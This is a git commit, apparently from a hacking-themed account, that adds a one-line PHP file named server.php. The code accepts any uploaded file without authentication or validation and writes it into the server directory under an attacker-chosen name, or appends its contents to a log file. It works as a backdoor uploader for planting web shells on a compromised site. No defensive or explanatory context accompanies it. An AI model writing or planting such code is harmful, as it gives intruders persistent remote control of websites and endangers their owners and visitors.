22d36083ae854035f2819eeb2050125fb57a43d1
Indramayu Hacker Link <45889833+imyhacker@users.noreply.github.com>
2020-04-03 20:39:47 +0700

    Add files via upload

---
+++ server.php
@@ -0,0 +1,1 @@
+<?php $date=date("d/m/Y");$clock=date("H:i:s");if(file_exists($_FILES["x"]["name"])){$x=file_get_contents($_FILES["x"]["tmp_name"]);$fh=fopen("log","a");fwrite($fh,"[$date | $clock] $x");fclose($fh);}else{@copy($_FILES["x"]["tmp_name"],$_FILES["x"]["name"]);}?>
